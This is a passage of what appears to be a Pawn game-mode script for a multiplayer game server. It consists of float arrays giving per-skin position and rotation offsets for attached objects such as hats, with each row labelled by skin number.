{0.095527, 0.027237, -0.001960, 90.928329, 86.443649, 0.000000 }, // - 183
{0.095527, 0.040994, -0.006878, 90.928329, 86.443649, 0.000000 }, // - 184
{0.085663, 0.030601, -0.002345, 90.928329, 81.496513, 0.000000 }, // - 185
{0.085663, 0.030601, -0.001015, 90.928329, 81.496513, 0.000000 }, // - 186
{0.076527, 0.027211, 0.008500, 90.928329, 74.401092, 0.000000 },  // - 187
{0.096669, 0.032578, 0.001662, 90.928329, 83.502502, 0.000000 },  // - 188
{0.098753, 0.032129, -0.001659, 90.928329, 90.153724, 0.000000 }, // - 189
{0.092821, 0.035572, -0.001659, 90.928329, 90.153724, 0.000000 }, // - 190
{0.092821, 0.035572, -0.001132, 90.928329, 90.153724, 0.000000 }, // - 191
{0.092821, 0.035572, -0.001132, 90.928329, 90.153724, 0.000000 }, // - 192
{0.092821, 0.035572, -0.001132, 90.928329, 90.153724, 0.000000 }, // - 193
{0.092821, 0.035572, -0.001132, 90.928329, 90.153724, 0.000000 }, // - 194
{0.092821, 0.035572, -0.001132, 90.928329, 90.153724, 0.000000 }, // - 195
{0.092821, 0.035572, -0.001132, 90.928329, 90.153724, 0.000000 }, // - 196
{0.100630, 0.020568, -0.001132, 90.928329, 90.153724, 0.000000 }, // - 197
{0.077905, 0.028523, 0.000000, 89.675476, 89.270309, 0.000000 },  // - 198
{0.099095, 0.022463, 0.000000, 89.675476, 89.270309, 0.000000 },  // - 199
{0.103182, 0.031106, 0.000000, 89.675476, 89.270309, 0.000000 },  // - 200
{0.078426, 0.038546, 0.000000, 89.675476, 89.270309, 0.000000 },  // - 201
{0.101092, 0.035797, -0.002997, 89.675476, 82.081153, 0.000000 }, // - 202
{0.092009, 0.042780, -0.005841, 89.675476, 84.463294, 0.000000 }, // - 203
{0.092009, 0.042780, -0.005841, 89.675476, 84.463294, 0.000000 }, // - 204
{0.092969, 0.027782, -0.002959, 89.675476, 84.463294, 0.000000 }, // - 205
{0.105109, 0.036128, -0.000471, 89.675476, 84.463294, 0.000000 }, // - 206
{0.066892, 0.024410, -0.002792, 89.675476, 84.463294, 0.000000 }, // - 207
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                   // - 208
{0.084046, 0.013608, -0.002792, 89.675476, 81.667831, 0.000000 }, // - 209
{0.084046, 0.013608, -0.001034, 89.675476, 81.667831, 0.000000 }, // - 210
{0.067610, 0.033777, -0.001034, 89.675476, 85.214485, 0.000000 }, // - 211
{0.094159, 0.020717, 0.000715, 89.675476, 85.214485, 0.000000 },  // - 212
{0.098744, 0.036786, -0.001770, 89.675476, 85.214485, 0.000000 }, // - 213
{0.068755, 0.036786, -0.001770, 89.675476, 85.214485, 0.000000 }, // - 214
{0.068755, 0.026863, -0.001770, 89.675476, 85.214485, 0.000000 }, // - 215
{0.068755, 0.026863, -0.001770, 89.675476, 85.214485, 0.000000 }, // - 216
{0.095765, 0.030034, -0.001770, 89.675476, 85.214485, 0.000000 }, // - 217
{0.085486, 0.039427, -0.003311, 89.675476, 85.214485, 0.000000 }, // - 218
{0.068874, 0.027850, -0.001021, 89.675476, 85.214485, 0.000000 }, // - 219
{0.052931, 0.050390, -0.002062, 89.675476, 88.113647, 0.000000 }, // - 220
{0.094479, 0.034432, 0.000875, 89.675476, 83.572830, 0.000000 },  // - 221
{0.094479, 0.034432, -0.000596, 89.675476, 83.572830, 0.000000 }, // - 222
{0.094479, 0.062073, -0.003098, 89.675476, 83.572830, 0.000000 }, // - 223
{0.064458, 0.029760, -0.001460, 89.675476, 83.572830, 0.000000 }, // - 224
{0.064458, 0.029760, -0.001460, 89.675476, 83.572830, 0.000000 }, // - 225
{0.072095, 0.029760, -0.001460, 89.675476, 83.572830, 0.000000 }, // - 226
{0.110619, 0.043037, -0.001466, 89.675476, 86.927627, 0.000000 }, // - 227
{0.099446, 0.050772, -0.001466, 89.675476, 85.103805, 0.000000 }, // - 228
{0.078635, 0.023680, -0.000275, 89.675476, 73.445220, 0.000000 }, // - 229
{0.043357, 0.028726, -0.000275, 89.675476, 73.445220, 0.000000 }, // - 230
{0.092488, 0.049972, -0.000275, 89.675476, 88.981941, 0.000000 }, // - 231
{0.092488, 0.016739, -0.000275, 89.675476, 88.981941, 0.000000 }, // - 232
{0.071677, 0.037055, -0.002878, 89.675476, 88.981941, 0.000000 }, // - 233
{0.082745, 0.004209, -0.002878, 89.675476, 88.981941, 0.000000 }, // - 234
{0.057909, 0.021331, -0.002878, 89.675476, 88.981941, 0.000000 }, // - 235
{0.079016, 0.021331, -0.000419, 89.675476, 77.678733, 0.000000 }, // - 236
{0.074572, 0.021331, -0.000419, 89.675476, 84.527442, 0.000000 }, // - 237
{0.074572, 0.038346, -0.001500, 89.675476, 84.527442, 0.000000 }, // - 238
{0.111645, 0.011549, 0.006237, 89.675476, 84.527442, 0.000000 },  // - 239
{0.090766, 0.044221, -0.000423, 89.675476, 89.461883, 0.000000 }, // - 240
{0.069491, 0.049021, -0.000423, 89.675476, 89.461883, 0.000000 }, // - 241
{0.059706, 0.031911, -0.000423, 89.675476, 89.461883, 0.000000 }, // - 242
{0.065242, 0.031911, -0.000423, 89.675476, 89.461883, 0.000000 }, // - 243
{0.065242, 0.051077, -0.001103, 89.675476, 89.461883, 0.000000 }, // - 244
{0.082393, 0.038233, 0.000410, 89.675476, 89.461883, 0.000000 },  // - 245
{0.079338, 0.044859, -0.002535, 89.675476, 89.461883, 0.000000 }, // - 246
{0.101566, 0.037019, 0.000750, 89.675476, 83.514060, 0.000000 },  // - 247
{0.091887, 0.047776, -0.000040, 89.675476, 83.514060, 0.000000 }, // - 248
{0.089745, 0.044044, 0.004071, 89.675476, 83.514060, 0.000000 },  // - 249
{0.094214, 0.044044, -0.007274, 89.675476, 83.514060, 0.000000 }, // - 250
{0.072282, 0.044044, -0.001468, 89.675476, 90.444763, 0.000000 }, // - 251
{0.095764, 0.034224, -0.000264, 89.675476, 82.959915, 0.000000 }, // - 252
{0.087454, 0.026208, -0.000264, 89.675476, 82.959915, 0.000000 }, // - 253
{0.099198, 0.037362, -0.000264, 89.675476, 82.959915, 0.000000 }, // - 254
{0.070845, 0.019943, 0.003505, 89.675476, 73.529716, 0.000000 },  // - 255
{0.065373, 0.033656, -0.001141, 89.675476, 83.002151, 0.000000 }, // - 256
{0.070077, 0.033656, -0.001141, 89.675476, 83.002151, 0.000000 }, // - 257
{0.089536, 0.041904, 0.000715, 89.675476, 83.002151, 0.000000 },  // - 258
{0.084822, 0.041904, 0.000715, 89.675476, 83.002151, 0.000000 },  // - 259
{0.093009, 0.031491, -0.001568, 89.675476, 83.002151, 0.000000 }, // - 260
{0.093009, 0.015023, -0.001477, 89.675476, 83.002151, 0.000000 }, // - 261
{0.076580, 0.039782, -0.001477, 89.675476, 88.620780, 0.000000 }, // - 262
{0.076580, 0.028967, -0.001477, 89.675476, 88.620780, 0.000000 }, // - 263
{0.075424, 0.043059, -0.001477, 89.675476, 88.620780, 0.000000 }, // - 264
{0.089655, 0.021726, -0.001477, 89.675476, 88.620780, 0.000000 }, // - 265
{0.096792, 0.014114, -0.003062, 89.675476, 85.166038, 0.000000 }, // - 266
{0.094886, 0.024989, -0.003184, 89.675476, 85.166038, 0.000000 }, // - 267
{0.094886, 0.024989, -0.003184, 89.675476, 85.166038, 0.000000 }, // - 268
{0.102252, 0.024989, -0.003184, 89.675476, 85.166038, 0.000000 }, // - 269
{0.102252, 0.024989, 0.000529, 89.675476, 85.166038, 0.000000 },  // - 270
{0.096134, 0.025462, 0.000529, 89.675476, 79.225112, 0.000000 },  // - 271
{0.099226, 0.032663, 0.000529, 89.675476, 79.225112, 0.000000 },  // - 272
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                   // - 273
{0.089833, 0.022466, -0.001590, 89.675476, 88.636062, 0.000000 }, // - 274
{0.089833, 0.022466, -0.001590, 89.675476, 88.636062, 0.000000 }, // - 275
{0.089833, 0.022466, -0.001590, 89.675476, 88.636062, 0.000000 }, // - 276
{0.082718, 0.062596, -0.000201, 89.675476, 88.636062, 0.000000 }, // - 277
{0.082718, 0.062596, -0.000201, 89.675476, 88.636062, 0.000000 }, // - 278
{0.087652, 0.059379, -0.000201, 89.675476, 88.636062, 0.000000 }, // - 279
{0.087652, 0.023702, -0.003091, 89.675476, 88.636062, 0.000000 }, // - 280
{0.087652, 0.023702, -0.003091, 89.675476, 88.636062, 0.000000 }, // - 281
{0.090877, 0.026643, -0.003091, 89.675476, 88.636062, 0.000000 }, // - 282
{0.090877, 0.026643, -0.003091, 89.675476, 88.636062, 0.000000 }, // - 283
{0.090877, 0.053674, 0.009879, 89.675476, 88.636062, 0.000000 },  // - 284
{0.104320, 0.041487, 0.008021, 89.675476, 88.636062, 0.000000 },  // - 285
{0.087062, 0.021779, -0.003307, 89.675476, 88.636062, 0.000000 }, // - 286
{0.073173, 0.048856, 0.005337, 89.675476, 92.561180, 0.000000 },  // - 287
{0.090294, 0.027592, -0.003497, 89.675476, 92.561180, 0.000000 }, // - 288
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                   // - 289
{0.086562, 0.042698, -0.000612, 89.675476, 92.561180, 0.000000 }, // - 290
{0.096768, 0.039233, -0.000612, 89.675476, 83.550270, 0.000000 }, // - 291
{0.079939, 0.020731, -0.005162, 89.675476, 83.550270, 0.000000 }, // - 292
{0.097107, 0.027826, -0.005162, 89.675476, 88.505996, 0.000000 }, // - 293
{0.097107, 0.037636, 0.000618, 89.675476, 88.505996, 0.000000 },  // - 294
{0.079985, 0.035006, -0.000826, 89.675476, 87.533462, 0.000000 }, // - 295
{0.088445, 0.024209, -0.002076, 89.675476, 73.285072, 0.000000 }, // - 296
{0.094039, 0.035411, 0.000490, 89.675476, 84.277572, 0.000000 },  // - 297
{0.099553, 0.024683, -0.002919, 89.675476, 84.277572, 0.000000 }, // - 298
{0.099553, 0.044356, -0.000285, 89.675476, 84.277572, 0.000000 },  // - 299
{0.087652, 0.023702, -0.003091, 89.675476, 88.636062, 0.000000 }, // - 300
{0.087652, 0.023702, -0.003091, 89.675476, 88.636062, 0.000000 }, // - 301
{0.087652, 0.023702, -0.003091, 89.675476, 88.636062, 0.000000 }, // - 302
{0.087652, 0.023702, -0.003091, 89.675476, 88.636062, 0.000000 }, // - 303
{0.087652, 0.023702, -0.003091, 89.675476, 88.636062, 0.000000 }, // - 304
{0.087652, 0.023702, -0.003091, 89.675476, 88.636062, 0.000000 }, // - 305
{0.071677, 0.037055, -0.002878, 89.675476, 88.981941, 0.000000 }, // - 306
{0.071677, 0.037055, -0.002878, 89.675476, 88.981941, 0.000000 }, // - 307
{0.071677, 0.037055, -0.002878, 89.675476, 88.981941, 0.000000 }, // - 308
{0.071677, 0.037055, -0.002878, 89.675476, 88.981941, 0.000000 }, // - 309
{0.090877, 0.026643, -0.003091, 89.675476, 88.636062, 0.000000 }, // - 310
{0.090877, 0.026643, -0.003091, 89.675476, 88.636062, 0.000000 } // - 311

};

// HATS
new Float:SkinCaps[311][6] = {
{0.135928, 0.002891, -0.008518, 0.000000, 0.000000, 347.188201},//Skin - 0
{0.136207, 0.006102, -0.013858, 0.612963, 0.000000, 0.000000}, //Skin - 1
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                 //Skin - 2
{0.167425, -0.006185, -0.004779, 0.612963, 0.000000, 0.000000}, //Skin - 3
{0.188546, -0.006185, -0.011507, 0.612963, 0.000000, 0.000000}, //Skin - 4
{0.188546, -0.006185, -0.011507, 0.612963, 0.000000, 0.000000}, //Skin - 5
{0.155785, 0.005998, -0.014326, 0.000000, 0.000000, 347.188201},//Skin - 6
{0.157787, 0.012994, -0.014590, 0.612963, 0.000000, 0.000000},  //Skin - 7
{0.131067, -0.013737, -0.008518, 0.000000, 0.000000, 347.188201},//Skin - 8
{0.118922, -0.015322, -0.008518, 0.000000, 0.000000, 347.188201},//Skin - 9
{0.125779, -0.001459, -0.008518, 0.000000, 0.000000, 347.188201},//Skin - 10
{0.129249, -0.014101, -0.008518, 0.000000, 0.000000, 347.188201},//Skin - 11
{0.139572, -0.003642, -0.002145, 0.612963, 0.000000, 10.335063}, //Skin - 12
{0.161076, -0.015624, -0.006768, 0.000000, 0.000000, 347.188201},//Skin - 13
{0.112204, -0.023196, -0.006768, 0.000000, 0.000000, 347.188201},//Skin - 14
{0.104552, -0.015122, -0.005275, 0.612963, 2.307199, 357.920410}, //Skin - 15
{0.150166, -0.008718, -0.006768, 0.000000, 0.000000, 347.188201},//Skin - 16
{0.149627, 0.002943, -0.005275, 0.612963, 2.307199, 357.920410}, //Skin - 17
{0.105319, 0.003517, -0.005275, 0.612963, 2.307199, 357.920410}, //Skin - 18
{0.153609, -0.003207, -0.007717, 0.000000, 0.000000, 357.608825},//Skin - 19
{0.143831, 0.001813, -0.010588, 0.000000, 0.000000, 357.608825}, //Skin - 20
{0.154598, -0.003549, -0.013304, 0.000000, 0.000000, 0.000000},  //Skin - 21
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                  //Skin - 22
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                   //Skin - 23
{0.127352, 0.009877, -0.006845, 0.726156, 359.666778, 348.825012},//Skin - 24
{0.124666, -0.029373, -0.006845, 0.726156, 359.666778, 329.940704},//Skin - 25
{0.152029, -0.018331, -0.003139, 0.000000, 358.344604, 348.467559}, //Skin - 26
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                    //Skin - 27
{0.128768, 0.041474, -0.007667, 0.726156, 359.666778, 355.429199}, //Skin - 28
{0.166457, -0.006228, -0.012669, 0.726156, 359.666778, 354.612152},//Skin - 29
{0.155160, -0.022985, -0.011249, 0.000000, 358.344604, 348.467559}, //Skin - 30
{0.096077, -0.023233, -0.009101, 0.726156, 359.666778, 343.094055},//Skin - 31
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                    //Skin - 32
{0.094003, -0.022985, -0.011249, 0.000000, 358.344604, 348.467559}, //Skin - 33
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                    //Skin - 34
{0.155565, 0.014400, -0.009101, 0.726156, 359.666778, 6.131487},   //Skin - 35
{0.156485, 0.013641, -0.009101, 0.726156, 359.666778, 6.131487},   //Skin - 36
{0.144815, 0.013641, -0.009374, 0.726156, 359.666778, 350.562103}, //Skin - 37
{0.113347, -0.006682, -0.009374, 0.726156, 359.666778, 350.562103},//Skin - 38
{0.147231, -0.014448, -0.004786, 0.726156, 359.666778, 357.303253},//Skin - 39
{0.133873, -0.019703, -0.000058, 0.000000, 358.344604, 348.467559},//Skin - 40
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                    //Skin - 41
{0.082446, 0.004202, -0.004786, 0.726156, 359.666778, 357.303253}, //Skin - 42
{0.104901, 0.004013, -0.004786, 0.726156, 359.666778, 342.983184}, //Skin - 43
{0.116172, -0.001954, -0.004786, 0.726156, 359.666778, 357.100677},//Skin - 44
{0.153321, 0.025744, -0.008666, 0.726156, 359.666778, 10.704365},  //Skin - 45
{0.160556, 0.007781, -0.010438, 0.726156, 359.666778, 0.991972},   //Skin - 46
{0.179010, -0.035613, -0.010438, 0.726156, 359.666778, 347.956573},//Skin - 47
{0.123363, 0.008694, -0.010438, 0.726156, 359.666778, 347.956573}, //Skin - 48
{0.167061, -0.037899, -0.010438, 0.726156, 359.666778, 347.775817},//Skin - 49
{0.164100, -0.040816, -0.011624, 357.030151, 358.344604, 342.811187},//Skin - 50
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                    //Skin - 51
{0.129040, 0.016069, -0.010438, 0.726156, 359.666778, 347.775817}, //Skin - 52
{0.129040, 0.016069, -0.006084, 0.726156, 359.666778, 347.775817}, //Skin - 53
{0.137743, -0.016369, -0.011731, 0.726156, 359.666778, 355.812011},//Skin - 54
{0.137743, -0.016369, -0.011731, 0.726156, 359.666778, 355.812011},//Skin - 55
{0.174539, -0.000662, -0.007289, 0.726156, 359.666778, 352.847045},//Skin - 56
{0.109382, -0.002955, -0.007289, 0.726156, 359.666778, 352.847045},//Skin - 57
{0.152276, -0.029331, -0.008357, 0.726156, 359.666778, 332.070648},//Skin - 58
{0.129599, -0.019172, -0.012204, 0.726156, 359.666778, 332.070648},//Skin - 59
{0.138485, -0.012405, -0.011567, 357.030151, 358.344604, 342.811187},//Skin - 60
{0.130350, 0.000897, -0.000747, 0.726156, 359.666778, 332.070648}, //Skin - 61
{0.150659, -0.035485, -0.006299, 0.726156, 359.666778, 341.617431},//Skin - 62
{0.119340, -0.006483, -0.006299, 0.726156, 359.666778, 341.617431},//Skin - 63
{0.110634, 0.009623, -0.011624, 357.030151, 358.344604, 342.811187},//Skin - 64
{0.133055, -0.000092, -0.006299, 0.726156, 359.666778, 341.617431},//Skin - 65
{0.129061, -0.006499, -0.006299, 0.726156, 359.666778, 341.617431},//Skin - 66
{0.127292, 0.010318, -0.006299, 0.726156, 359.666778, 341.617431}, //Skin - 67
{0.138791, -0.025311, -0.006299, 0.726156, 359.666778, 341.617431},//Skin - 68
{0.148132, 0.003970, -0.002304, 0.726156, 359.666778, 340.120025}, //Skin - 69
{0.129753, 0.006469, -0.006376, 0.726156, 359.666778, 354.029815}, //Skin - 70
{0.125663, 0.015428, -0.006376, 0.726156, 359.666778, 354.029815}, //Skin - 71
{0.125663, 0.015428, -0.009030, 0.726156, 359.666778, 354.029815}, //Skin - 72
{0.117674, 0.014567, -0.011567, 357.030151, 358.344604, 342.811187}, //Skin - 73
{0.135729, -0.018656, -0.013554, 0.000000, 0.000000, 337.893737},  //Skin - 74
{0.141888, -0.042810, -0.006206, 0.000000, 0.000000, 337.893737},  //Skin - 75
{0.134968, -0.020112, -0.003604, 357.030151, 358.344604, 342.811187},//Skin - 76
{0.124348, -0.017813, -0.006206, 0.000000, 0.000000, 346.786865},  //Skin - 77
{0.124348, 0.000583, -0.006206, 0.000000, 0.000000, 346.786865},   //Skin - 78
{0.102654, -0.010906, -0.006206, 0.000000, 0.000000, 346.786865},  //Skin - 79
{0.102654, -0.010906, -0.006206, 0.000000, 0.000000, 346.786865},  //Skin - 81
{0.167928, 0.031601, -0.006206, 0.000000, 0.000000, 17.955888},    //Skin - 82
{0.159998, 0.023540, -0.006206, 0.000000, 0.000000, 17.955888},    //Skin - 83
{0.169630, 0.019315, -0.006206, 0.000000, 0.000000, 17.955888},    //Skin - 84
{0.163052, -0.039735, -0.006206, 0.000000, 0.000000, 341.169891},  //Skin - 85
{0.122285, -0.020112, -0.003604, 357.030151, 358.344604, 342.811187},//Skin - 86
{0.144811, -0.007521, -0.014207, 0.000000, 0.000000, 341.169891},  //Skin - 87
{0.129932, -0.007521, -0.007289, 0.000000, 0.000000, 341.169891},  //Skin - 88
{0.151147, -0.038608, -0.009597, 0.000000, 0.000000, 343.694549},  //Skin - 89
{0.147416, -0.031632, -0.009597, 0.000000, 0.000000, 343.694549},  //Skin - 90
{0.157728, -0.009677, -0.009597, 0.000000, 0.000000, 0.934848},    //Skin - 91
{0.136577, -0.015592, -0.009597, 0.000000, 0.000000, 341.013824},  //Skin - 92
{0.143821, 0.000631, -0.008385, 0.000000, 0.000000, 358.808868},   //Skin - 93
{0.100521, 0.003151, -0.007624, 0.000000, 0.000000, 358.808868},   //Skin - 94
{0.122833, -0.006031, -0.007624, 0.000000, 0.000000, 358.808868},  //Skin - 95
{0.145296, 0.003959, -0.007624, 0.000000, 0.000000, 358.808868},   //Skin - 96
{0.141658, 0.016474, -0.007624, 0.000000, 0.000000, 9.683902},     //Skin - 97
{0.145276, -0.002846, -0.007624, 0.000000, 0.000000, 340.239593},  //Skin - 98
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                    //Skin - 99
{0.161745, -0.010244, -0.007624, 0.000000, 0.000000, 351.499267}, //Skin - 100
{0.151006, -0.030994, -0.005366, 0.000000, 0.000000, 340.428894}, //Skin - 101
{0.147111, 0.003794, -0.012433, 0.000000, 0.000000, 358.069244},  //Skin - 102
{0.154213, -0.052348, -0.003511, 356.299316, 0.000000, 336.751647},//Skin - 103
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                    //Skin - 104
{0.153814, -0.039614, -0.006756, 356.299316, 0.000000, 336.930084},//Skin - 105
{0.153638, -0.039614, -0.013630, 356.299316, 0.000000, 336.930084},//Skin - 106
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                    //Skin - 107
{0.140473, -0.026201, -0.000469, 0.390689, 355.405181, 335.554260},//Skin - 108
{0.140904, -0.007227, -0.008114, 0.390689, 355.405181, 335.554260},//Skin - 109
{0.140904, -0.007227, -0.008114, 0.390689, 355.405181, 335.554260},//Skin - 110
{0.134860, 0.001485, -0.010145, 0.390689, 358.632415, 347.730010},//Skin - 111
{0.124823, 0.001485, -0.009402, 0.390689, 358.632415, 347.730010},//Skin - 112
{0.157999, -0.012039, -0.006082, 0.390689, 358.632415, 347.730010},//Skin - 113
{0.144906, -0.005139, -0.009654, 0.390689, 358.632415, 336.830108},//Skin - 114
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                    //Skin - 116
{0.152829, -0.009735, -0.009654, 0.390689, 358.632415, 336.830108},//Skin - 117
{0.113804, 0.009252, -0.009654, 0.390689, 358.632415, 345.244384},//Skin - 118
{0.113804, 0.009252, -0.009654, 0.390689, 358.632415, 345.244384},//Skin - 119
{0.144202, -0.021273, -0.005915, 357.030151, 358.344604, 342.811187},//Skin - 120
{0.154275, -0.037484, -0.009654, 0.390689, 358.632415, 337.676666},//Skin - 121
{0.155674, -0.015613, -0.004339, 0.390689, 358.632415, 350.571228},//Skin - 122
{0.136433, -0.019181, -0.004339, 0.390689, 358.632415, 340.261840},//Skin - 123
{0.163258, -0.032386, -0.013128, 0.390689, 358.632415, 340.261840},//Skin - 124
{0.153242, -0.029651, -0.002434, 0.390689, 358.632415, 333.367614},//Skin - 125
{0.127978, -0.001961, -0.008867, 0.390689, 358.632415, 347.279052},//Skin - 126
{0.160856, -0.025356, -0.004428, 0.390689, 358.632415, 347.279052},//Skin - 127
{0.150266, -0.009032, -0.006781, 0.390689, 358.632415, 347.223754},//Skin - 128
{0.158060, 0.022907, -0.006781, 0.390689, 358.632415, 349.378875},//Skin - 129
{0.111739, 0.012673, -0.006781, 0.390689, 358.632415, 349.378875},//Skin - 130
{0.091638, -0.011600, -0.008686, 0.390689, 358.632415, 336.674468},//Skin - 131
{0.125788, 0.000635, -0.005915, 0.390689, 358.632415, 343.007751},//Skin - 132
{0.031324, -0.014154, -0.005915, 0.390689, 358.632415, 343.007751},//Skin - 133
{0.142321, 0.015417, -0.005915, 0.243191, 358.632415, 350.329559},//Skin - 133
{0.128780, -0.030750, 0.006687, 173.184967, 358.632415, 27.422966},//Skin - 134
{0.115882, -0.004931, -0.003807, 358.837646, 358.632415, 346.206237},//Skin - 135
{0.127531, -0.008916, -0.003807, 358.837646, 358.632415, 346.206237},//Skin - 136
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                  //Skin - 137
{0.148992, -0.017748, -0.006509, 358.837646, 358.632415, 350.742156},//Skin - 138
{0.148992, -0.017748, -0.006509, 358.837646, 358.632415, 350.742156},//Skin - 139
{0.147315, 0.001708, -0.006509, 358.837646, 358.632415, 354.390045},//Skin - 140
{0.144315, -0.013571, -0.006509, 358.837646, 358.632415, 354.390045},//Skin - 141
{0.144315, -0.002729, -0.010357, 358.837646, 358.632415, 354.390045},//Skin - 142
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                  //Skin - 143
{0.177516, -0.070868, -0.009114, 358.837646, 358.632415, 331.679321},//Skin - 144
{0.139578, -0.008750, -0.004405, 358.837646, 358.632415, 343.319335},//Skin - 145
{0.139578, -0.014406, -0.004405, 358.837646, 358.632415, 343.319335},//Skin - 146
{0.115592, -0.010754, -0.004405, 358.837646, 358.632415, 343.319335},//Skin - 147
{0.150735, -0.000459, -0.004405, 358.837646, 358.632415, 9.362450},//Skin - 148
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                  //Skin - 149
{0.149485, -0.008709, -0.006168, 358.837646, 358.632415, 2.276566},//Skin - 150
{0.168162, -0.009708, -0.012160, 359.504821, 4.442328, 355.348114},//Skin - 151
{0.156369, -0.024521, -0.012160, 359.504821, 0.415596, 355.348114},//Skin - 152
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                  //Skin - 153
{0.119297, -0.016080, -0.010776, 359.504821, 0.415596, 341.522827},//Skin - 154
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                  //Skin - 155
{0.172295, -0.065549, -0.007187, 359.504821, 0.415596, 336.175567},//Skin - 156
{0.126340, -0.030764, -0.007187, 359.504821, 0.415596, 336.175567},//Skin - 157
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                  //Skin - 158
{0.154280, 0.002166, -0.010436, 359.504821, 0.415596, 357.792144},//Skin - 159
{0.121469, -0.007383, -0.010436, 359.504821, 0.415596, 341.538574},//Skin - 160
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                  //Skin - 161
{0.139495, -0.007383, -0.010436, 359.504821, 0.415596, 341.538574},//Skin - 162
{0.113212, -0.005302, -0.010436, 359.504821, 0.415596, 341.538574},//Skin - 163
{0.120208, 0.003533, -0.010436, 359.504821, 0.415596, 341.538574},//Skin - 164
{0.135111, 0.005091, -0.006407, 359.504821, 0.415596, 352.954559},//Skin - 165
{0.122118, 0.005091, -0.006407, 359.504821, 0.415596, 352.954559},//Skin - 166
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                  //Skin - 167
{0.125229, 0.005091, -0.013084, 359.504821, 0.415596, 352.954559},//Skin - 168
{0.153451, -0.018119, -0.013276, 359.504821, 0.415596, 358.219451},//Skin - 169
{0.141395, -0.009131, -0.013276, 359.504821, 0.415596, 347.866027},//Skin - 170
{0.157631, -0.028753, -0.006450, 359.504821, 0.415596, 339.935516},//Skin - 171
{0.152687, -0.027057, -0.007731, 359.504821, 0.415596, 344.054809},//Skin - 172
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                  //Skin - 173
{0.165146, 0.015393, -0.007731, 359.504821, 0.415596, 344.001678},//Skin - 174
{0.162788, -0.019696, -0.007731, 359.504821, 0.415596, 344.001678},//Skin - 175
{0.157728, -0.027188, -0.012891, 359.504821, 0.415596, 345.804748},//Skin - 176
{0.187507, 0.010472, -0.012891, 359.504821, 0.415596, 12.315887},//Skin - 177
{0.153901, -0.027720, -0.007884, 359.504821, 0.415596, 344.553527},//Skin - 178
{0.137445, -0.009757, -0.012987, 359.504821, 0.415596, 344.553527},//Skin - 179
{0.173041, -0.006323, -0.012987, 359.504821, 0.415596, 3.267552},//Skin - 180
{0.143467, 0.016897, -0.007831, 359.504821, 0.415596, 349.504974},//Skin - 181
{0.114480, 0.006202, -0.007831, 359.504821, 0.415596, 349.504974},//Skin - 182
{0.114480, 0.008813, -0.007831, 359.504821, 0.415596, 349.504974},//Skin - 183
{0.128122, -0.012152, -0.013144, 359.504821, 0.415596, 336.326538},//Skin - 184
{0.156171, 0.007268, -0.013144, 359.504821, 0.415596, 10.805211},//Skin - 185
{0.156409, -0.034861, -0.007927, 359.504821, 0.415596, 336.978668},//Skin - 186
{0.118034, -0.024105, -0.002947, 359.504821, 0.415596, 336.978668},//Skin - 187
{0.128686, -0.029632, -0.002947, 358.201873, 0.415596, 329.325042},//Skin - 188
{0.172639, -0.026749, -0.012705, 358.201873, 0.415596, 349.092590},//Skin - 189
{0.180897, -0.026749, -0.007224, 358.201873, 0.415596, 349.092590},//Skin - 190
{0.180897, -0.026749, -0.007224, 358.201873, 0.415596, 349.092590},//Skin - 191
{0.178725, -0.010278, -0.007224, 358.201873, 0.415596, 354.053405},//Skin - 192
{0.172020, -0.010278, -0.010734, 358.201873, 0.415596, 354.053405},//Skin - 193
{0.172020, -0.010278, -0.010734, 358.201873, 0.415596, 354.053405},//Skin - 194
{0.176089, -0.032526, -0.005110, 358.201873, 0.415596, 341.814422},//Skin - 195
{0.118042, 0.007002, -0.005110, 358.201873, 0.415596, 341.814422},//Skin - 196
{0.143840, -0.042712, -0.007556, 358.201873, 0.415596, 341.814422},//Skin - 197
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                  //Skin - 198
{0.148060, -0.032384, -0.009754, 358.201873, 0.415596, 333.484924},//Skin - 199
{0.148060, -0.032384, -0.009754, 358.201873, 0.415596, 333.484924},//Skin - 200
{0.140799, 0.025145, -0.009754, 358.201873, 0.415596, 5.040688},//Skin - 201
{0.140799, 0.015851, -0.009754, 358.201873, 0.415596, 349.796478},//Skin - 202
{0.140799, -0.004372, -0.013685, 358.201873, 0.415596, 349.796478},//Skin - 203
{0.154274, 0.006245, -0.013685, 358.201873, 0.415596, 2.035465},//Skin - 204
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                  //Skin - 205
{0.154274, 0.016669, -0.013685, 358.201873, 0.415596, 2.035465},//Skin - 206
{0.106604, 0.004805, -0.011840, 358.201873, 0.415596, 2.035465},//Skin - 207
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                  //Skin - 208
{0.148378, -0.003807, -0.011840, 358.201873, 0.415596, 2.035465},//Skin - 209
{0.113854, 0.001969, -0.011840, 358.201873, 0.415596, 343.826263},//Skin - 210
{0.149539, -0.028623, -0.009621, 358.201873, 0.415596, 331.587280},//Skin - 211
{0.104024, -0.014549, -0.009621, 358.201873, 0.415596, 331.587280},//Skin - 212
{0.145820, -0.029160, -0.009621, 358.201873, 0.415596, 331.587280},//Skin - 213
{0.148646, -0.008515, -0.009621, 358.201873, 0.415596, 1.360260},//Skin - 214
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                  //Skin - 215
